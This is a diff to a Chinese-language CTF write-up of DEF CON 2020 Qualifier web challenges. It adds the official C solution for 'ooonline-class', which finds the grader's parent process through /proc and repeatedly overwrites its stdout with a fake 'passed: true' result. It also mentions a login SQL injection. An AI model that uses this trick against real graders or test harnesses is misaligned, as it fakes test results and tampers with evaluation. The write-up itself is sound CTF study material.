@@ -1,6 +1,6 @@
 Title = "Defcon CTF Qual 2020  writeup "
 
-description = "Defcon 2020 Qual 的 web 着实有点没出好！！"
+description = "Defcon 2020 Qual 的 web"
 
 tags = ["CTF","Web"] 
 
@@ -415,7 +415,7 @@ http://dogooos.challenges.ooo:37453/dogooo/
 
 http://ooonline-class.challenges.ooo:5000/
 
-这道题跟 dogooos 放出的时间差不多，一出来就被非预期了，是道 OJ 类型的题目，但是在登陆处有 sql injection （真·黑客大赛，你爱非预期就非预期。。。）给出官方放出的 exp
+这道题跟 dogooos 放出的时间差不多，一出来就被非预期了，是道 OJ 类型的题目，可以提交代码运行，但是在登陆处有 sql injection （真·黑客大赛，你爱非预期就非预期。。。）给出官方放出的 exp
 
 ```python
 #!/usr/bin/env python3
@@ -504,6 +504,53 @@ if __name__ == '__main__':
 通过 sql injection 获取到 admin 账号，然后查看到 submission ，被非预期之后，官方放出了 revenge ，预期解法是通过 /proc/来覆写stdout 
 
 https://github.com/o-o-overflow/dc2020q-ooonline-class-public/blob/master/interaction/solution.c
+
+```c
+#include <sys/types.h>
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+
+char fake_output[] = "      {\"passed\": true, \"message\": \"you got hacked\"}\n";
+
+int main()
+{
+   pid_t me;
+   char buf[4096];
+   char cmd[4096];
+   char state;
+   pid_t parent;
+   int fd;
+   char path[4096];
+   int num;
+
+   // Get parent pid
+   fd = syscall(SYS_open, "/proc/self/stat", O_RDONLY);
+   num = read(fd, buf, 4096);
+   buf[num] = '\0';
+
+   sscanf(buf, "%d %s %c %d", &me, cmd, &state, &parent);
+   //close(fd);
+
+   // Write fake_output to parent stdout (so that that's the output of the grader script)
+   snprintf(path, 4096, "/proc/%d/fd/1", parent);
+   path[4095] = '\0';
+
+   while (1) {
+      fd = syscall(SYS_open, path, O_WRONLY | O_TRUNC);
+      write(fd, fake_output, sizeof(fake_output)-1);
+      close(fd);
+   }
+
+   //close(fd);
+
+   //kill(parent, SIGKILL);
+
+   return 0;
+}
+```
 
 
 
